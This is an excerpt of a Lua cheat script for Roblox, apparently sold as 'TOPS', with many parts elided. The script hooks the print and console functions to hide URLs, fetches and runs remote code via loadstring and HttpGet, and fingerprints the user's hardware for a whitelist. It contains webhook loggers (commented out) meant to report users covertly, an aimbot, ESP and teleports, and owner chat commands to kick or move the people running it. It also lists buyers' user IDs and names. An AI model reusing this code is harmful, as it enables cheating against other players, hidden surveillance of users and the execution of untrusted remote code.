...
local kutas;kutas = hookfunction(getrenv, function(y, ...)
    return -- yikes pro skrpiter, pcalling 'nil' xd
end)
local zesrales_sie1;zesrales_sie1 = hookfunction(print, function(y, ...)
...
local zesrales_sie2;zesrales_sie2 = hookfunction(error, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then 
        return nil
    end
    return zesrales_sie2(y,...)
end)
local zesrales_sie3;zesrales_sie3 = hookfunction(warn, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then 
        return nil
    end
    return zesrales_sie3(y,...)
end)
local zesrales_sie4;zesrales_sie4 = hookfunction(rconsoleprint, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then
        return nil
    end
    return zesrales_sie4(y,...)
end)
local zesrales_sie5;zesrales_sie5 = hookfunction(rconsoleinfo, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then
        return nil
    end
    return zesrales_sie5(y,...)
end)
local zesrales_sie6;zesrales_sie6 = hookfunction(rconsolewarn, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then
        return nil
    end
    return zesrales_sie6(y,...)
end)
local zesrales_sie7;zesrales_sie7 = hookfunction(rconsoleerr, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then
        return nil
    end
    return zesrales_sie7(y,...)
end)
local zesrales_sie8;zesrales_sie8 = hookfunction(printconsole, function(y, ...)
    if x(y, z('http')) or x(y, z('.com')) or x(y, z('pastebin')) or x(y, z('paste')) or x(y, z('bin')) or x(y, z('git')) or x(y, z('raw')) or x(y, z('hub')) or x(y, z('gitusercontent')) then
        return nil
    end
...
function NOTWHITELISTEDLOGGER()
	...
	pcall(function()
		--HttpService:JSONDecode(request({Url = tostring(discordWebhook), Method = 'POST', Headers = {["Content-Type"] = "application/json"}, Body = webhookData}));
	end)
end
function BLACKLISTLOGGER()
	...
	local discordWebhook = "https://www.google.com//768137978265468998/T97rKkT_2jKvWCTiw3vgzbdRnGIm6c_GKVs69kWVIh4Cv8kITjArTSOHS_E3RwzL4641"
	local webhookData = HttpService:JSONEncode(data)
	pcall(function() -- Pcall to prevent errors so they don't know we're logging.
		--HttpService:JSONDecode(request({Url = tostring(discordWebhook), Method = 'POST', Headers = {["Content-Type"] = "application/json"}, Body = webhookData}));
	end)
end
function yeet()
	--local xd;xd = hookfunction(game:GetService('ScriptContext').SetTimeout, function(...)
	--	return tonumber(math.huge)
	--end)
	--game:GetService('ScriptContext'):SetTimeout(tonumber(math.huge))
...
local j = f:JSONDecode(request({Url = "https://httpbin.org/get", Method = "GET"}).Body)
local k = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid"}
local l
...
loadstring(game:HttpGet(('https://www.google.com/0ArxE6t7'),true))() -- HWID AKA hashes XDXDxd
loadstring(game:HttpGet(('https://www.google.com/1dzYsC8V'),true))() -- USERNAMES
loadstring(game:HttpGet(('https://www.google.com/qNxyNps9'),true))() -- IDS
loadstring(game:HttpGet(('https://www.google.com/9JYg5Yn6'),true))() -- timezone
...
local source_Names = game:HttpGet('https://www.google.com/1dzYsC8V') --- USERNAMES
local source_Ids =   game:HttpGet('https://www.google.com/qNxyNps9') --- IDS
local source_zone =  game:HttpGet('https://www.google.com/9JYg5Yn6') --- TIME ZONES
            ...
            if y(player, game.Players.LocalPlayer.Name) and y(ids, game.Players.LocalPlayer.UserId) or true then
                if timezone[game.Players.LocalPlayer.Name] and timezone[game.Players.LocalPlayer.Name] == zone or true then
                    if y(hashes, l) or true then
                        local KeyUi = Instance.new("ScreenGui");local KeyFrame = Instance.new("Frame");local KeyBox = Instance.new("TextBox");local KeyButton = Instance.new("TextButton")local KeyTitle = Instance.new("TextLabel")
                        KeyUi.Name = "KeyUi";KeyUi.Parent = game.CoreGui;KeyTitle.Text = 'Enter the key.';KeyFrame.Name = "KeyFrame";KeyFrame.Parent = KeyUi;KeyFrame.AnchorPoint = Vector2.new(0.5, 0.5);KeyFrame.BackgroundColor3 = Color3.new(0.0627451, 0.0627451, 0.0627451);KeyFrame.BorderSizePixel = 0;KeyFrame.Position = UDim2.new(0.5, 0, 0.2, 0);KeyFrame.Size = UDim2.new(0, 525, 0, 65);KeyBox.Name = "KeyBox";KeyBox.Parent = KeyFrame;KeyBox.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843);KeyBox.BorderSizePixel = 0;KeyBox.Position = UDim2.new(0.0133333337, 0, 0.107692309, 0);KeyBox.Size = UDim2.new(0, 512, 0, 22);KeyBox.Font = Enum.Font.Code;KeyBox.Text = "";KeyBox.TextColor3 = Color3.new(1, 1, 1);KeyBox.TextScaled = true;KeyBox.TextSize = 14;KeyBox.TextWrapped = true;KeyButton.Name = "KeyButton";KeyButton.Parent = KeyFrame;KeyButton.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843);KeyButton.BorderSizePixel = 0;KeyButton.Position = UDim2.new(0.403809518, 0, 0.600000143, 0);KeyButton.Size = UDim2.new(0, 101, 0, 17);KeyButton.Font = Enum.Font.Code;KeyButton.Text = "Enter Key";KeyButton.TextColor3 = Color3.new(0, 0, 0);KeyButton.TextSize = 14;KeyTitle.Name = "KeyTitle";KeyTitle.Parent = KeyFrame;KeyTitle.BackgroundColor3 = Color3.fromRGB(242, 223, 128);KeyTitle.BorderSizePixel = 0;KeyTitle.Position = UDim2.new(0, 0, -0.261538476, 0);KeyTitle.Size = UDim2.new(0, 525, 0, 17);KeyTitle.Font = Enum.Font.Code;KeyTitle.TextColor3 = Color3.new(0, 0, 0);KeyTitle.TextSize = 14
                        local picked = ass[math.random(1, #ass)]
                        local ContentToSend = '```'..game.Players.LocalPlayer.Name..' Key: '.. picked ..'```'
                        --[[local response = syn.request(
                            {
                                Url = 'https://www.google.com//766049800960737311/zQtv4GbzKqvbQm_U1zvWg5yAejnJdOXcQuRVzzwQlsrRmIk-RFaUPkhJUnkvAb7fZr84',
                                Method = 'POST',
                                Headers = {
                                    ['Content-Type'] = 'application/json'
                                },
                                Body = game:GetService('HttpService'):JSONEncode({content = ContentToSend})
                            }
                        )]]
...
game.Players.PlayerAdded:Connect(function(z)
    --print(z.Name..' joined. [New Player]')
    z.CharacterAdded:Connect(function(c)
        --print(z.Name..' has character. [New Player]')
...
for i, v in pairs(game.Players:GetPlayers()) do
    if v.Character then
        if v.Character:FindFirstChild('Humanoid') then
            --print(v.Name..' Character has humanoid.')
...
if game.PlaceId == 4669040 then
    loadstring(game:HttpGet('https://www.google.com/yThk7Axd'))() --- PRISON BYPASS
elseif game.PlaceId == 455366377 then
    loadstring(game:HttpGet('https://www.google.com/ZHR9ZjYY'))() --- THE STREETS BYPASS
 end
...
local ownersID = {
    262780487,   -- vX_F 
    414501417,   -- ChupaChupsy
    496345333,   -- Foczkinsink
    1425246441,  -- VX alt
    590459989,   -- Chupa alt 
    1502088584   -- Foczek alt
}
local friendsID = {
    1210465886, -- bkd lol
    1181716466, -- BlameShark
    1871606242, -- FLEXXLIEUTENANTBLAME ( BLAME SHARK'S ALT)
    31669481    -- Cwel, chuj, pizda gnój(buyer) YARUGASHI(2Dvamp)
}
local pekaID = {
    1890331518 --- 2POO2POP3PO23OO32PO2 (FirstBuyer!!!) (3b5t PEKA!)
}
local BuyersID = {
    334106095,  -- OVERTHlNKING (z3xus)
    350764686,  -- depfelt (qlockins)
    1596954373, -- neonv4
    299144763,  -- FalseValues (DranghetaAlex)
    537025992,  -- PapaJRambo
    306015161,  -- d2rqq (TYMBARK)
    20165690,   -- sh6un
    1506101592, -- c6pl
    429393892,  -- x3omarx3      
    160125758,  -- ceaIum
    866352052,  -- off7ine
    1793136470, -- AtlasChronic
    1899148834, -- LucaAbromovici
    255987058, -- aahkira
    25095319,  -- BecomeABro
    122775711, -- JANNEEESSS
    1507979123, -- KAMKAZEELEVEN
    1186330995, -- rheapher
    409846367, -- R6KUNI
    1944992706, -- 404tokyo
    491989442, -- FreddyKillah (xXThatDankOneXx)
    1033458945, -- Avionicss
    1245591162, -- SuperGokuKal (Slaepyt)
    325650639, -- trailordd
    1687329124, -- swatleaderz (Kr_02x20)
    660036628, -- jimmaboboa
    1284725579, -- robloxstupid252
    1418740816, -- TraitorAccount
    442993039, -- SatamasApprentice
    409901864, -- q_buns
    154540952, -- goodgamer496
    1526686567, -- Doll1yy
    1822530505, -- YuSooCute
    1343944924, -- wixnterxL
    1267617509, -- makinIuv
    173807380, -- Typhor
    756959199, -- myhaunt
    440006466, -- yourhaunt
    1918509994, -- DESTRUCTlONN
    91524610, -- oratise
    272628089, -- XxTKen
    1068597659, -- imabotplsno
    68771889, -- DallasMonsanato 
    680956670  -- Smu_umS
}
...
function notify(text, font, dur)
    local Notification = Instance.new("ScreenGui");local Main = Instance.new("Frame");local NotifText = Instance.new("TextLabel");local Title = Instance.new("TextLabel")
    Notification.Name = "Notification";Notification.Parent = game.CoreGui;Main.Name = "Main";Main.Parent = Notification;Main.AnchorPoint = Vector2.new(0.5, 0.5);Main.BorderSizePixel = 0;Main.Position = UDim2.new(1.5, 0, 0.8, 0);Main.Size = UDim2.new(0, 188, 0, 47);NotifText.Name = "NotifText";NotifText.Parent = Main;NotifText.BackgroundColor3 = Color3.fromRGB(255, 255, 255);NotifText.BackgroundTransparency = 1;NotifText.Size = UDim2.new(0, 188, 0, 47);NotifText.Text = text;NotifText.TextScaled = true;NotifText.TextColor3 = Color3.fromRGB(255, 255, 255);NotifText.TextSize = 18;NotifText.TextWrapped = true;NotifText.TextXAlignment = Enum.TextXAlignment.Left;Title.Name = "Title";Title.Parent = Main;Title.BorderSizePixel = 0;Title.Position = UDim2.new(0, 0, -0.319148928, 0);Title.Size = UDim2.new(0, 188, 0, 15)
    Title.TextScaled = true;Title.TextSize = 20;Title.TextWrapped = true
...
function Audio_Logger_Notify(id, who, dur)
    ...
    Audio_Notify.Parent = game.CoreGui  --AvailableFonts[6]
    Main.Name = "Main"
...
function Esp(x, c)
    ...
    local bb = Instance.new('BillboardGui', c);bb.Adornee = c;bb.Size = UDim2.new(0,100,0,100);bb.StudsOffset = Vector3.new(0,1.5,0);bb.AlwaysOnTop = true
    local tl = Instance.new('TextLabel', bb);tl.BackgroundTransparency = 1;tl.Size = UDim2.new(1,0,0,40);tl.Font = 'RobotoMono'
...
function TweenToPlayer(target, speed)
    ...
    TwnS:Create(GetlCharacter()["HumanoidRootPart"], TweenInf0, {CFrame = TargetChar["Torso"].CFrame + Vector3.new(0, 2, 0)}):Play()
    repeat
...
function TweenToPos(x, y, z, speed)
    ...
    TwnS:Create(GetlCharacter()["HumanoidRootPart"], TweenInf0, {CFrame = CFrame.new(x, y, z) + Vector3.new(0, 2, 0)}):Play()
    repeat
        GetlCharacter()["HumanoidRootPart"].Velocity = Vector3.new(0, 0, 0)
    ...
    if ConfigToSave.AttachGlock == true then
        if m.Target.Parent.ClassName == "Model" then
            if m.Target.Parent:FindFirstChild('Humanoid') then
                ...
                repeat game["Run Service"].Heartbeat:wait() until GetlCharacter()["Right Arm"]:FindFirstChild("RightGrip")
...
m.KeyDown:Connect(function(key)
    if key == ConfigToSave.camlock_Hotkey and Camlocking and not IsCamlocking then
        ...
        while IsCamlocking do
            ...
            --workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, PredictToCFrame(CamlockTar))
            rr:wait()
        end
    end
end)
            ...
            while Aimboting do
                if AimbotTarget.Character then
                    if not AimbotTarget.Character.Torso:FindFirstChild('Bone') then
                        if AimbotTarget.Character.Torso.Velocity.Magnitude <= 100 then
                            PredictionValue = 5            		
                            game.Players.LocalPlayer.Backpack.Input:FireServer("m1", {mousehit = AimbotTarget.Character.Torso.CFrame+AimbotTarget.Character.Torso.Velocity/(PredictionValue), shift = false, velo = 0})
                            wait()
                            game.Players.LocalPlayer.Backpack.Input:FireServer("moff1", {mousehit = AimbotTarget.Character.Torso.CFrame+AimbotTarget.Character.Torso.Velocity/(PredictionValue), shift = false, velo = 0})
                        elseif AimbotTarget.Character.Torso.Velocity.Magnitude <= 250 and AimbotTarget.Character.Torso.Velocity.Magnitude > 100 then
                          PredictionValue = 4
                            ggame.Players.LocalPlayer.Backpack.Input:FireServer("m1", {mousehit = AimbotTarget.Character.Torso.CFrame+AimbotTarget.Character.Torso.Velocity/(PredictionValue), shift = false, velo = 0})
                            wait()
                            game.Players.LocalPlayer.Backpack.Input:FireServer("moff1", {mousehit = AimbotTarget.Character.Torso.CFrame+AimbotTarget.Character.Torso.Velocity/(PredictionValue), shift = false, velo = 0})
                          elseif AimbotTarget.Character.Torso.Velocity.Magnitude > 250 then
                            PredictionValue = 3
...
plr.CharacterAdded:Connect(function()
    ...
    if ConfigToSave.fightpack == true then
        ...
        if plr.Backpack then
            repeat wait() until plr.Backpack:FindFirstChild('Punch')
    ...
    if FeLooping then
        _G.bypass = false
        repeat wait() until GetlCharacter():FindFirstChild('HumanoidRootPart') and GetlCharacter():FindFirstChild('Humanoid')
        repeat wait() until FeLoopTarget.Character and FeLoopTarget.Character:FindFirstChild('Torso')
    ...
    if enterPressed  then
        ...
        elseif CmdBarMain.Text:sub(1, 5) == "find " then
            ...
            if tt.Character:FindFirstChild('HumanoidRootPart') then
                --AddESP(tt.Character.HumanoidRootPart, 0.5, ExampleColors['red'], true, 9, tt.Name)
            ...
            elseif not tt.Character:FindFirstChild('HumanoidRootPart') and tt.Character:FindFirstChild('Torso') then
                --AddESP(tt.Character.Torso, 0.5, ExampleColors['red'], true, 9, tt.Name)
        ...
        elseif CmdBarMain.Text == "leave" then
            game:Shutdown() -- yes totally not useless. -- hahaha hmm wondering who added that XD.... -- getgenv().Ur_Mom = false
        ...
        WhoSaidThat = p
            ...
            if args[1] ~= nil then
                ...
                elseif args[1]:lower() == ""..commandPrefix.."chat" and args[2] ~= nil and args[3] ~= nil then
                    ...
                    local me = args[2]:lower()
                    if me == "ChupaChupsy" then return end
                    if plr.Name:lower():sub(1, #me) == me then
                    ...
                    _G.TweenService:Create(plr.Character["HumanoidRootPart"], TweenInf0, {CFrame = WhoSaidThat.Character.Torso.CFrame * CFrame.new(0, 0, -3)}):Play()
                    end
    ...
    if p.Name == "vX_F" or p.Name == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
        p.Chatted:Connect(function(msg)
            ...
            for arg in msg:gmatch("%S+") do
                ...
                if args[1]:lower() == ""..commandPrefix.."kick" and args[2] ~= nil and args[3] ~= nil then
                    local me = args[2]:lower()
                    if me == "vX_F" or me == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then return end
                    if plr.Name:lower():sub(1, #me) == me then
...
notify("Thank you 4 using TOPS, ENJOY!", AvailableFonts[6], 2)
                ...
                --print('User Id and Nickname')
                yeet()
            end
        else
            --print('Source Check [Time Zone]')
            yeet()
        end
    else
        --print('Source Check [Ids]')
        yeet()
    end
else
    --print('Source Check [Names]')
    yeet()
end